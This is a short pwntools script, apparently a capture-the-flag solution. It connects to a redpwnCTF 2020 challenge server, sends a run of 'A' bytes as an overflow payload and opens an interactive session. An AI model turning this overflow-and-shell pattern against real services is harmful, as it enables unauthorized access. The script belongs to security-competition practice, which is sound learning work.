#!/usr/bin/python3

from pwn import *

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAA"

p = remote("2020.redpwnc.tf" ,31199)
p.sendline(payload)
p.interactive()